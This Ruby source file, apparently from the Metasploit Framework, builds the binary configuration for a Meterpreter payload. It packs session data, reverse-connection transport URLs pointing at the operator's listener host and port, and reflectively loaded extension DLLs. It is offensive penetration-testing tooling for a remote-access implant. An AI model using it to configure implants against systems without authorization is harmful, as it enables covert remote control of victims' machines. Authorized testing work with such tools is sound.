# -*- coding: binary -*-
require 'msf/core/payload/uuid'
require 'msf/core/reflective_dll_loader'

class Rex::Payloads::Meterpreter::Config

  include Msf::ReflectiveDLLLoader

  UUID_SIZE = 64
  URL_SIZE = 512

  def initialize(opts={})
    @opts = opts
  end

  def to_b
    config_block(@opts)
  end

private

  def to_wchar_t(item, size)
    item.to_s.ljust(size, "\x00").unpack("C*").pack("v*")
  end

  def session_block(opts={})
    uuid = to_wchar_t(opts[:uuid], UUID_SIZE)

    session_data = [
      0,                 # comms socket, patched in by the stager
      0,                 # listen socket, patched in by the stager
      opts[:expiration], # Session expiry
      uuid,              # the URL to use
    ].pack("VVVA*")
  end

  def transport_block(opts={})
    # Build the URL from the given parameters, and pad it out to the
    # correct size
    url = "#{opts[:scheme]}://#{opts[:lhost]}:#{opts[:lport]}"
    url << "#{opts[:uri]}/" if opts[:uri]
    url = to_wchar_t(url, URL_SIZE)

    transport_data = [
      opts[:comm_timeout], # communications timeout
      opts[:retry_total],  # retry total time
      opts[:retry_wait],   # retry wait time
      url
    ].pack("VVVA*")
  end

  def extension_block(ext_name, file_extension)
    ext_name = ext_name.strip.downcase
    ext, o = load_rdi_dll(MeterpreterBinaries.path("ext_server_#{ext_name}",
                                                   file_extension))

    extension_data = [ ext.length, ext ].pack("VA*")
  end

  def config_block(opts={})
    # start with the session information
    config = session_block(opts)

    # then load up the transport configurations
    (opts[:transports] || []).each do |t|
      config << transport_block(t)
    end

    # terminate the transports with a single NULL byte
    config << "\x00"

    # configure the extensions
    (opts[:extensions] || []).each do |e|
      config << extension_block(e, opts[:file_extension])
    end

    # terminate the extensions with a 0 size
    config << [0].pack("V")

    # and we're done
    config
  end
end
